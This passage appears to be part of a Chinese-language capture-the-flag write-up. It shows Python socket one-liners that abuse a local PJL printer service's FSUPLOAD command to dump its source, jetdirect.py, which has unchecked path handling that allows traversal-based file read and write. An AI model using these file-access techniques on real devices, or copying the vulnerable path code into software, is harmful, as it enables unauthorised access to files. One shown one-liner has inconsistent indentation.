+</span></span><span class="line"><span class="cl">b<span class="s1">&#39;. TYPE=DIR\n.. TYPE=DIR\nlogs TYPE=DIR SIZE=4096\njetdirect.py TYPE=FILE SIZE=5119\r\n&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lp@paperwork:/opt$ python3 -c <span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; import socket
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s = socket.socket()
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s.connect((&#39;127.0.0.1&#39;, 9100))
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s.send(b&#39;@PJL FSUPLOAD NAME=\&#34;0:jetdirect.py\&#34;\r\n&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; res = s.recv(4096)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; print(res)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s.close()
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; &#34;</span>
+</span></span><span class="line"><span class="cl">b<span class="s1">&#39;@PJL FSUPLOAD NAME=&#34;0:jetdirect.py&#34; SIZE=5119\n#!/usr/bin/env python3\n\nimport os\nimport sys\nimport socket\nimport logging\nimport re\nimport hashlib\n\nclass PJLServer:\n    def __init__(self):\n        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\n    def listen(self, port=9100, backlog=100):\n        self._server.bind((&#34;127.0.0.1&#34;, port))\n        self._server.listen(backlog)\n        logging.info(&#34;Listening on port %d&#34; % port)\n\n    def accept(self):\n        client, addr = self._server.accept()\n        logging.info(&#34;[%s] connected&#34; % addr[0])\n        return PJLClient(client, addr[0])\n\nclass PJLClient:\n    def __init__(self, client, address):\n        self._client = client\n        self._address = address\n\n    def get_line(self):\n        &#34;&#34;&#34;Reads until a newline to get a single PJL command.&#34;&#34;&#34;\n        line = b&#34;&#34;\n        while True:\n            char = self._client.recv(1)\n            if not char: return None\n            line += char\n            if char == b&#34;\\n&#34;: break\n        return line\n\n    def reply(self, message):\n        if isinstance(message, str):\n            message = message.encode(&#34;utf-8&#34;)\n        self._client.sendall(message)\n\n    def close(self):\n        self._client.close()\n\nclass Filesystem:\n    def __init__(self, root_dir):\n        self._root = os.path.abspath(root_dir)\n\n    def _translate(self, path):\n        clean = path.replace(&#34;0:&#34;, &#34;&#34;).replace(&#34;\\\\&#34;, &#34;/&#34;).lstrip(&#34;/&#34;)\n        return os.path.normpath(os.path.join(self._root, clean))\n\n    def listdir(self, name=&#34;&#34;):\n        target = self._translate(name)\n        if not os.path.exists(target): return &#34;FILEERROR=1&#34;\n        try:\n            items = os.listdir(target)\n            res = [&#34;. TYPE=DIR&#34;, &#34;.. TYPE=DIR&#34;]\n            for i in items:\n                p = os.path.join(target, i)\n                res.append(f&#34;{i} TYPE={\&#39;</span>DIR<span class="se">\&#39;</span> <span class="k">if</span> os.path.isdir<span class="o">(</span>p<span class="o">)</span> <span class="k">else</span> <span class="se">\&#39;</span>FILE<span class="se">\&#39;</span><span class="o">}</span> <span class="nv">SIZE</span><span class="o">={</span>os.path.getsize<span class="o">(</span>p<span class="o">)}</span><span class="s2">&#34;)\n            return &#34;</span><span class="se">\\</span>n<span class="s2">&#34;.join(res)\n        except: return &#34;</span><span class="nv">FILEERROR</span><span class="o">=</span>1<span class="s2">&#34;\n\n    def read(self, path):\n        target = self._translate(path)\n        if os.path.isfile(target):\n            with open(target, &#34;</span>rb<span class="s2">&#34;) as f: return f.read()\n        return None\n\n    def write(self, path, data):\n        target = self._translate(path)\n        try:\n            os.makedirs(os.path.dirname(target), exist_ok=True)\n            with open(target, &#34;</span>wb<span class="s2">&#34;) as f: f.write(data)\n            return &#34;</span>OK<span class="s2">&#34;\n        except: return &#34;</span><span class="nv">FILEERROR</span><span class="o">=</span>1<span class="s2">&#34;\n\nfs = None\n\ndef handle_download(command, client):\n    m = re.search(r\&#39;NAME\\s*=\\s*&#34;</span><span class="o">([</span>^<span class="s2">&#34;]+)&#34;</span><span class="se">\\</span>s*SIZE<span class="se">\\</span>s*<span class="o">=</span><span class="se">\\</span>s*<span class="o">(</span><span class="se">\\</span>d+<span class="o">)</span><span class="se">\&#39;</span>, command, re.I<span class="o">)</span><span class="se">\n</span>    <span class="k">if</span> not m: <span class="k">return</span> <span class="s2">&#34;FILEERROR=1&#34;</span><span class="se">\n</span>    path, <span class="nv">size</span> <span class="o">=</span> m.group<span class="o">(</span>1<span class="o">)</span>, int<span class="o">(</span>m.group<span class="o">(</span>2<span class="o">))</span><span class="se">\n</span>    <span class="se">\n</span>    logging.info<span class="o">(</span>f<span class="s2">&#34;Receiving file: {path} ({size} bytes)&#34;</span><span class="o">)</span><span class="se">\n</span>    <span class="nv">data</span> <span class="o">=</span> b<span class="s2">&#34;&#34;</span><span class="se">\n</span>    <span class="k">while</span> len<span class="o">(</span>data<span class="o">)</span> &lt; size:<span class="se">\n</span>        <span class="nv">chunk</span> <span class="o">=</span> client._client.recv<span class="o">(</span>min<span class="o">(</span>size - len<span class="o">(</span>data<span class="o">)</span>, 4096<span class="o">))</span><span class="se">\n</span>        <span class="k">if</span> not chunk: break<span class="se">\n</span>        <span class="nv">data</span> <span class="o">+=</span> chunk<span class="se">\n</span>    <span class="k">return</span> fs.write<span class="o">(</span>path, data<span class="o">)</span><span class="se">\n\n</span>def handle_upload<span class="o">(</span><span class="nb">command</span><span class="o">)</span>:<span class="se">\n</span>    <span class="nv">m</span> <span class="o">=</span> re.search<span class="o">(</span>r<span class="se">\&#39;</span>NAME<span class="se">\\</span>s*<span class="o">=</span><span class="se">\\</span>s*<span class="s2">&#34;([^&#34;</span><span class="o">]</span>+<span class="o">)</span><span class="s2">&#34;\&#39;, command, re.I)\n    if not m: return &#34;</span><span class="nv">FILEERROR</span><span class="o">=</span>1<span class="s2">&#34;\n    path = m.group(1)\n    data = fs.read(path)\n    if data is None: return &#34;</span><span class="nv">FILEERROR</span><span class="o">=</span>1<span class="s2">&#34;\n    header = f\&#39;@PJL FSUPLOAD NAME=&#34;</span><span class="o">{</span>path<span class="o">}</span><span class="s2">&#34; SIZE={len(data)}\\n\&#39;.encode(&#34;</span>utf-8<span class="s2">&#34;)\n    return header + data\n\nif __name__ == &#34;</span>__main__<span class="s2">&#34;:\n    if len(sys.argv) &lt; 3:\n        print(f&#34;</span>Usage: <span class="o">{</span>sys.argv<span class="o">[</span>0<span class="o">]}</span> &lt;PORT&gt; &lt;ROOT_DIR&gt;<span class="s2">&#34;)\n        sys.exit(1)\n\n    fs = Filesystem(sys.argv[2])\n    LOG_FILE = &#34;</span>/home/archivist/printer/logs/commands.log<span class="s2">&#34;\n    logging.basicConfig(\n        level=logging.INFO,\n        format=&#34;</span>%<span class="o">(</span>message<span class="o">)</span>s<span class="s2">&#34;,\n        handlers=[\n            logging.FileHandler(LOG_FILE),\n            logging.StreamHandler(sys.stdout)\n        ]\n    )\n    server = PJLServer()\n    server.listen(int(sys.argv[1]))\n\n    while True:\n        client = server.accept()\n        while True:\n            line_bytes = client.get_line()\n            if not line_bytes: break\n            \n            # Filter protocol noise\n            if b&#34;</span>@<span class="s2">&#34; not in line_bytes: continue\n            line = line_bytes[line_bytes.find(b&#34;</span>@<span class="s2">&#34;):].decode(&#34;</span>utf-8<span class="s2">&#34;, errors=&#34;</span>ignore<span class="s2">&#34;).strip()\n   &#39;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>读取 <code>jetdirect.py</code> 文件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">import socket
+</span></span></span><span class="line"><span class="cl"><span class="s2">s = socket.socket()
+</span></span></span><span class="line"><span class="cl"><span class="s2">s.connect((&#39;127.0.0.1&#39;, 9100))
+</span></span></span><span class="line"><span class="cl"><span class="s2">s.send(b&#39;@PJL FSUPLOAD NAME=\&#34;0:jetdirect.py\&#34;\r\n&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">f = open(&#39;/tmp/jetdirect.py&#39;, &#39;wb&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">while True:
+</span></span></span><span class="line"><span class="cl"><span class="s2">	d = s.recv(1024)
+</span></span></span><span class="line"><span class="cl"><span class="s2">	if not d:
+</span></span></span><span class="line"><span class="cl"><span class="s2">		break
+</span></span></span><span class="line"><span class="cl"><span class="s2">    f.write(d)
+</span></span></span><span class="line"><span class="cl"><span class="s2">f.close()
+</span></span></span><span class="line"><span class="cl"><span class="s2">s.close()
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lp@paperwork:/opt$ cat /tmp/jetdirect.py 
+</span></span><span class="line"><span class="cl">@PJL FSUPLOAD <span class="nv">NAME</span><span class="o">=</span><span class="s2">&#34;0:jetdirect.py&#34;</span> <span class="nv">SIZE</span><span class="o">=</span><span class="m">5119</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">import sys
+</span></span><span class="line"><span class="cl">import socket
+</span></span><span class="line"><span class="cl">import logging
+</span></span><span class="line"><span class="cl">import re
+</span></span><span class="line"><span class="cl">import hashlib
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class PJLServer:
+</span></span><span class="line"><span class="cl">    def __init__<span class="o">(</span>self<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        self._server <span class="o">=</span> socket.socket<span class="o">(</span>socket.AF_INET, socket.SOCK_STREAM<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        self._server.setsockopt<span class="o">(</span>socket.SOL_SOCKET, socket.SO_REUSEADDR, 1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    def listen<span class="o">(</span>self, <span class="nv">port</span><span class="o">=</span>9100, <span class="nv">backlog</span><span class="o">=</span>100<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        self._server.bind<span class="o">((</span><span class="s2">&#34;127.0.0.1&#34;</span>, port<span class="o">))</span>
+</span></span><span class="line"><span class="cl">        self._server.listen<span class="o">(</span>backlog<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        logging.info<span class="o">(</span><span class="s2">&#34;Listening on port %d&#34;</span> % port<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    def accept<span class="o">(</span>self<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        client, <span class="nv">addr</span> <span class="o">=</span> self._server.accept<span class="o">()</span>
+</span></span><span class="line"><span class="cl">        logging.info<span class="o">(</span><span class="s2">&#34;[%s] connected&#34;</span> % addr<span class="o">[</span>0<span class="o">])</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> PJLClient<span class="o">(</span>client, addr<span class="o">[</span>0<span class="o">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class PJLClient:
+</span></span><span class="line"><span class="cl">    def __init__<span class="o">(</span>self, client, address<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        self._client <span class="o">=</span> client
+</span></span><span class="line"><span class="cl">        self._address <span class="o">=</span> address
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    def get_line<span class="o">(</span>self<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;Reads until a newline to get a single PJL command.&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">line</span> <span class="o">=</span> b<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> True:
+</span></span><span class="line"><span class="cl">            <span class="nv">char</span> <span class="o">=</span> self._client.recv<span class="o">(</span>1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> not char: <span class="k">return</span> None
+</span></span><span class="line"><span class="cl">            <span class="nv">line</span> <span class="o">+=</span> char
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nv">char</span> <span class="o">==</span> b<span class="s2">&#34;\n&#34;</span>: <span class="nb">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> line
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    def reply<span class="o">(</span>self, message<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> isinstance<span class="o">(</span>message, str<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">            <span class="nv">message</span> <span class="o">=</span> message.encode<span class="o">(</span><span class="s2">&#34;utf-8&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        self._client.sendall<span class="o">(</span>message<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    def close<span class="o">(</span>self<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        self._client.close<span class="o">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class Filesystem:
+</span></span><span class="line"><span class="cl">    def __init__<span class="o">(</span>self, root_dir<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        self._root <span class="o">=</span> os.path.abspath<span class="o">(</span>root_dir<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    def _translate<span class="o">(</span>self, path<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        <span class="nv">clean</span> <span class="o">=</span> path.replace<span class="o">(</span><span class="s2">&#34;0:&#34;</span>, <span class="s2">&#34;&#34;</span><span class="o">)</span>.replace<span class="o">(</span><span class="s2">&#34;\\&#34;</span>, <span class="s2">&#34;/&#34;</span><span class="o">)</span>.lstrip<span class="o">(</span><span class="s2">&#34;/&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> os.path.normpath<span class="o">(</span>os.path.join<span class="o">(</span>self._root, clean<span class="o">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    def listdir<span class="o">(</span>self, <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        <span class="nv">target</span> <span class="o">=</span> self._translate<span class="o">(</span>name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> not os.path.exists<span class="o">(</span>target<span class="o">)</span>: <span class="k">return</span> <span class="s2">&#34;FILEERROR=1&#34;</span>
+</span></span><span class="line"><span class="cl">        try:
+</span></span><span class="line"><span class="cl">            <span class="nv">items</span> <span class="o">=</span> os.listdir<span class="o">(</span>target<span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">res</span> <span class="o">=</span> <span class="o">[</span><span class="s2">&#34;. TYPE=DIR&#34;</span>, <span class="s2">&#34;.. TYPE=DIR&#34;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> i in items:
+</span></span><span class="line"><span class="cl">                <span class="nv">p</span> <span class="o">=</span> os.path.join<span class="o">(</span>target, i<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                res.append<span class="o">(</span>f<span class="s2">&#34;{i} TYPE={&#39;DIR&#39; if os.path.isdir(p) else &#39;FILE&#39;} SIZE={os.path.getsize(p)}&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;\n&#34;</span>.join<span class="o">(</span>res<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        except: <span class="k">return</span> <span class="s2">&#34;FILEERROR=1&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    def read<span class="o">(</span>self, path<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        <span class="nv">target</span> <span class="o">=</span> self._translate<span class="o">(</span>path<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> os.path.isfile<span class="o">(</span>target<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">            with open<span class="o">(</span>target, <span class="s2">&#34;rb&#34;</span><span class="o">)</span> as f: <span class="k">return</span> f.read<span class="o">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> None
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    def write<span class="o">(</span>self, path, data<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        <span class="nv">target</span> <span class="o">=</span> self._translate<span class="o">(</span>path<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        try:
+</span></span><span class="line"><span class="cl">            os.makedirs<span class="o">(</span>os.path.dirname<span class="o">(</span>target<span class="o">)</span>, <span class="nv">exist_ok</span><span class="o">=</span>True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">            with open<span class="o">(</span>target, <span class="s2">&#34;wb&#34;</span><span class="o">)</span> as f: f.write<span class="o">(</span>data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;OK&#34;</span>
+</span></span><span class="line"><span class="cl">        except: <span class="k">return</span> <span class="s2">&#34;FILEERROR=1&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">fs</span> <span class="o">=</span> None
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def handle_download<span class="o">(</span>command, client<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">    <span class="nv">m</span> <span class="o">=</span> re.search<span class="o">(</span>r<span class="s1">&#39;NAME\s*=\s*&#34;([^&#34;]+)&#34;\s*SIZE\s*=\s*(\d+)&#39;</span>, command, re.I<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> not m: <span class="k">return</span> <span class="s2">&#34;FILEERROR=1&#34;</span>
+</span></span><span class="line"><span class="cl">    path, <span class="nv">size</span> <span class="o">=</span> m.group<span class="o">(</span>1<span class="o">)</span>, int<span class="o">(</span>m.group<span class="o">(</span>2<span class="o">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    logging.info<span class="o">(</span>f<span class="s2">&#34;Receiving file: {path} ({size} bytes)&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">data</span> <span class="o">=</span> b<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> len<span class="o">(</span>data<span class="o">)</span> &lt; size:
+</span></span><span class="line"><span class="cl">        <span class="nv">chunk</span> <span class="o">=</span> client._client.recv<span class="o">(</span>min<span class="o">(</span>size - len<span class="o">(</span>data<span class="o">)</span>, 4096<span class="o">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> not chunk: <span class="nb">break</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">data</span> <span class="o">+=</span> chunk
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> fs.write<span class="o">(</span>path, data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def handle_upload<span class="o">(</span><span class="nb">command</span><span class="o">)</span>:
+</span></span><span class="line"><span class="cl">    <span class="nv">m</span> <span class="o">=</span> re.search<span class="o">(</span>r<span class="s1">&#39;NAME\s*=\s*&#34;([^&#34;]+)&#34;&#39;</span>, command, re.I<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> not m: <span class="k">return</span> <span class="s2">&#34;FILEERROR=1&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">path</span> <span class="o">=</span> m.group<span class="o">(</span>1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">data</span> <span class="o">=</span> fs.read<span class="o">(</span>path<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> data is None: <span class="k">return</span> <span class="s2">&#34;FILEERROR=1&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">header</span> <span class="o">=</span> f<span class="s1">&#39;@PJL FSUPLOAD NAME=&#34;{path}&#34; SIZE={len(data)}\n&#39;</span>.encode<span class="o">(</span><span class="s2">&#34;utf-8&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> header + data
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nv">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span>:
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> len<span class="o">(</span>sys.argv<span class="o">)</span> &lt; 3:
+</span></span><span class="line"><span class="cl">        print<span class="o">(</span>f<span class="s2">&#34;Usage: {sys.argv[0]} &lt;PORT&gt; &lt;ROOT_DIR&gt;&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        sys.exit<span class="o">(</span>1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">fs</span> <span class="o">=</span> Filesystem<span class="o">(</span>sys.argv<span class="o">[</span>2<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">LOG_FILE</span> <span class="o">=</span> <span class="s2">&#34;/home/archivist/printer/logs/commands.log&#34;</span>
+</span></span><span class="line"><span class="cl">    logging.basicConfig<span class="o">(</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">level</span><span class="o">=</span>logging.INFO,
+</span></span><span class="line"><span class="cl">        <span class="nv">format</span><span class="o">=</span><span class="s2">&#34;%(message)s&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="nv">handlers</span><span class="o">=[</span>
+</span></span><span class="line"><span class="cl">            logging.FileHandler<span class="o">(</span>LOG_FILE<span class="o">)</span>,
+</span></span><span class="line"><span class="cl">            logging.StreamHandler<span class="o">(</span>sys.stdout<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="o">]</span>
+</span></span><span class="line"><span class="cl">    <span class="o">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">server</span> <span class="o">=</span> PJLServer<span class="o">()</span>
+</span></span><span class="line"><span class="cl">    server.listen<span class="o">(</span>int<span class="o">(</span>sys.argv<span class="o">[</span>1<span class="o">]))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> True:
+</span></span><span class="line"><span class="cl">        <span class="nv">client</span> <span class="o">=</span> server.accept<span class="o">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> True:
+</span></span><span class="line"><span class="cl">            <span class="nv">line_bytes</span> <span class="o">=</span> client.get_line<span class="o">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> not line_bytes: <span class="nb">break</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1"># Filter protocol noise</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> b<span class="s2">&#34;@&#34;</span> not in line_bytes: <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">line</span> <span class="o">=</span> line_bytes<span class="o">[</span>line_bytes.find<span class="o">(</span>b<span class="s2">&#34;@&#34;</span><span class="o">)</span>:<span class="o">]</span>.decode<span class="o">(</span><span class="s2">&#34;utf-8&#34;</span>, <span class="nv">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="o">)</span>.strip<span class="o">()</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> not line.startswith<span class="o">(</span><span class="s2">&#34;@PJL&#34;</span><span class="o">)</span>: <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">            logging.info<span class="o">(</span>f<span class="s2">&#34;Command: {line}&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;FSDOWNLOAD&#34;</span> in line.upper<span class="o">()</span>:
+</span></span><span class="line"><span class="cl">                <span class="nv">res</span> <span class="o">=</span> handle_download<span class="o">(</span>line, client<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                client.reply<span class="o">(</span>res + <span class="s2">&#34;\r\n&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="s2">&#34;FSUPLOAD&#34;</span> in line.upper<span class="o">()</span>:
+</span></span><span class="line"><span class="cl">                <span class="nv">res</span> <span class="o">=</span> handle_upload<span class="o">(</span>line<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                client.reply<span class="o">(</span>res<span class="o">)</span>
